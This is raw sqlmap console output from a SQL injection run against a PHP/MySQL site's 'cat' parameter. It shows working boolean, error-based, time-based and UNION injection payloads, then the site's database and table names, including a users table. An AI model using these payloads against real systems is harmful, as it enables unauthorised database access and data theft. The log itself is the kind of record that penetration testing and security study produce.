        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.3.15#dev}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:12:59 /2024-04-07/

[23:12:59] [INFO] resuming back-end DBMS 'mysql' 
[23:12:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2438=2438

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x71706b6b71,(SELECT (ELT(1265=1265,1))),0x717a707071),1265)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cat=1 AND (SELECT 5435 FROM (SELECT(SLEEP(5)))fuNW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT NULL,CONCAT(0x71706b6b71,0x706f6b6c7355497a6245796974654c4a6a4e764b614f54466b6f4c5153776b564969535953535a67,0x717a707071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[23:12:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.6.40, Nginx 1.19.0
back-end DBMS: MySQL >= 5.6
[23:12:59] [INFO] fetching database names
[23:12:59] [INFO] fetching tables for databases: 'acuart, information_schema'
Database: acuart
[8 tables]
+---------------------------------------+
| artists                               |
| carts                                 |
| categ                                 |
| featured                              |
| guestbook                             |
| pictures                              |
| products                              |
| users                                 |
+---------------------------------------+

Database: information_schema
[79 tables]
+---------------------------------------+
| ADMINISTRABLE_ROLE_AUTHORIZATIONS     |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS_EXTENSIONS                    |
| COLUMN_PRIVILEGES                     |
| COLUMN_STATISTICS                     |
| ENABLED_ROLES                         |
| FILES                                 |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CACHED_INDEXES                 |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_COLUMNS                        |
| INNODB_DATAFILES                      |
| INNODB_FIELDS                         |
| INNODB_FOREIGN                        |
| INNODB_FOREIGN_COLS                   |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_INDEXES                        |
| INNODB_METRICS                        |
| INNODB_SESSION_TEMP_TABLESPACES       |
| INNODB_TABLES                         |
| INNODB_TABLESPACES                    |
| INNODB_TABLESPACES_BRIEF              |
| INNODB_TABLESTATS                     |
| INNODB_TEMP_TABLE_INFO                |
| INNODB_TRX                            |
| INNODB_VIRTUAL                        |
| KEYWORDS                              |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| RESOURCE_GROUPS                       |
| ROLE_COLUMN_GRANTS                    |
| ROLE_ROUTINE_GRANTS                   |
| ROLE_TABLE_GRANTS                     |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMATA_EXTENSIONS                   |
| SCHEMA_PRIVILEGES                     |
| STATISTICS                            |
| ST_GEOMETRY_COLUMNS                   |
| ST_SPATIAL_REFERENCE_SYSTEMS          |
| ST_UNITS_OF_MEASURE                   |
| TABLESPACES                           |
| TABLESPACES_EXTENSIONS                |
| TABLES_EXTENSIONS                     |
| TABLE_CONSTRAINTS                     |
| TABLE_CONSTRAINTS_EXTENSIONS          |
| TABLE_PRIVILEGES                      |
| USER_ATTRIBUTES                       |
| USER_PRIVILEGES                       |
| VIEWS                                 |
| VIEW_ROUTINE_USAGE                    |
| VIEW_TABLE_USAGE                      |
| COLUMNS                               |
| ENGINES                               |
| EVENTS                                |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| TABLES                                |
| TRIGGERS                              |
+---------------------------------------+

[23:12:59] [INFO] fetched data logged to text files under 'C:\Users\ADMIN\AppData\Local\sqlmap\output\testphp.vulnweb.com'

[*] ending @ 23:12:59 /2024-04-07/

